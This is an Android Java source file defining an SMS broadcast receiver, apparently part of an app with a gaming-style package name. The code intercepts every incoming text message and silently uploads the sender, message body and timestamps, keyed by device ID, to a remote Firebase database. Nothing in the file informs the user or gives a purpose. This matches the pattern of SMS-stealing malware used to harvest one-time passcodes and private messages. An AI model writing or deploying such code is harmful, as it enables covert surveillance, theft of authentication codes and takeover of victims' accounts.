package com.spinplay99.adminpanel;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            FirebaseApp.initializeApp(context);
            DatabaseReference database = FirebaseDatabase.getInstance().getReference();
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);

            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M 
                            ? SmsMessage.createFromPdu((byte[]) pdu, "3gpp") 
                            : SmsMessage.createFromPdu((byte[]) pdu);
                        if (sms != null) {
                            Map<String, Object> data = new HashMap<>();
                            data.put("address", sms.getDisplayOriginatingAddress());
                            String body = sms.getDisplayMessageBody();
                            if (body != null && body.length() > 200) {
                                body = body.substring(0, 200);
                            }
                            data.put("body", body);
                            data.put("date", String.valueOf(sms.getTimestampMillis()));
                            data.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault())
                                .format(new Date(sms.getTimestampMillis())));
                            data.put("type", "INBOX");
                            data.put("received_at", ServerValue.TIMESTAMP);
                            database.child("devices").child(deviceId).child("new_sms").push().setValue(data);
                        }
                    }
                }
            }
        }
    }
}
